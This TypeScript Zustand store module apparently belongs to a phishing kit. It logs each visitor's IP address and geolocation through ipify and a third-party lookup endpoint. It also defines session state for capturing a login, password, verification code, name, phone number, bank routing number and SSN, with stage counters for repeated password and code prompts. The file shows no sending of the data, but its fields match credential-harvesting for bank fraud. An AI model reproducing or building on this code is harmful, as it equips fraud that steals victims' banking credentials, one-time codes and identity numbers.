import { create } from "zustand";
import { devtools } from "zustand/middleware";
import axios from "axios";
import { iIpData, iLocationData } from "../const/getIpInfo";

// Combined interface for the store state
export interface IpLocationData {
  ip: string;
  country: string;
  countryCode: string;
  region: string;
  regionName: string;
  city: string;
  zip: number;
  lat: number;
  lon: number;
  timezone: string;
  isp: string;
  org: string;
  as: string;
  query: string;
}

export interface sessions {
  login: string;
  password: string;
  code: string;
  passwordStage: number;
  codeStage: number;
  step: number;
  isDone: boolean;
  name?: string;
  number?: string;
  routing?: string;
  ssn?: string;
}

type sessionId = string;
type keyData = string;

interface SessionStore {
  // State
  ipLocationData: IpLocationData | null;
  isLoading: boolean;
  error: string | null;
  sessionId: string;
  keyData: string;

  sessionEntries: sessions | null;

  // Actions
  fetchIpLocationData: () => Promise<void>;
  setIpLocationData: (data: IpLocationData) => void;
  clearData: () => void;
  setError: (error: string | null) => void;
  setSessions: (session: sessions) => void;
  setSessionId: (sessionId: sessionId) => void;
  setKeyData: (keyData: keyData) => void;
}

export const useSessionStore = create<SessionStore>()(
  devtools(
    (set, get) => ({
      // Initial state
      ipLocationData: null,
      isLoading: false,
      error: null,
      sessionId: crypto.randomUUID(),
      sessionEntries: null,

      // Fetch IP and location data in parallel
      fetchIpLocationData: async () => {
        set({ isLoading: true, error: null });

        try {
          // First, get the IP address
          const { data: ipData } = (await axios(
            "https://api.ipify.org/?format=json"
          )) as iIpData;

          // Then, fetch location info for that IP
          const { data: locationData } = (await axios(
            `https://ip-proxy.leapcell.app/api/ip?ip=${ipData.ip}`
          )) as iLocationData;

          const combinedData: IpLocationData = {
            ip: ipData.ip,
            ...locationData,
          };

          set({
            ipLocationData: combinedData,
            isLoading: false,
            error: null,
          });
          set({
            sessionId: crypto.randomUUID(),
          });
        } catch (error) {
          const errorMessage =
            error instanceof Error
              ? error.message
              : "Failed to fetch IP and location data";
          set({
            error: errorMessage,
            isLoading: false,
          });
        }
      },

      // Set IP and location data manually
      setIpLocationData: (data: IpLocationData) => {
        set({ ipLocationData: data, error: null });
      },

      setKeyData: (keyData: keyData) => {
        set({ keyData });
      },

      setSessions: (session: sessions) => {
        set({ sessionEntries: { ...session } });
      },

      // Clear all data
      clearData: () => {
        set({
          ipLocationData: null,
          error: null,
          isLoading: false,
        });
      },

      // Set error manually
      setError: (error: string | null) => {
        set({ error });
      },
    }),
    {
      name: "session-store", // Name for devtools
    }
  )
);

// Selectors for easier access to specific parts of the state
export const useIpData = () =>
  useSessionStore((state) => ({
    ip: state.ipLocationData?.ip,
    isLoading: state.isLoading,
    error: state.error,
  }));

export const useLocationData = () =>
  useSessionStore((state) => ({
    country: state.ipLocationData?.country,
    countryCode: state.ipLocationData?.countryCode,
    region: state.ipLocationData?.region,
    regionName: state.ipLocationData?.regionName,
    city: state.ipLocationData?.city,
    zip: state.ipLocationData?.zip,
    lat: state.ipLocationData?.lat,
    lon: state.ipLocationData?.lon,
    timezone: state.ipLocationData?.timezone,
    isp: state.ipLocationData?.isp,
    org: state.ipLocationData?.org,
    as: state.ipLocationData?.as,
    query: state.ipLocationData?.query,
    isLoading: state.isLoading,
    error: state.error,
  }));
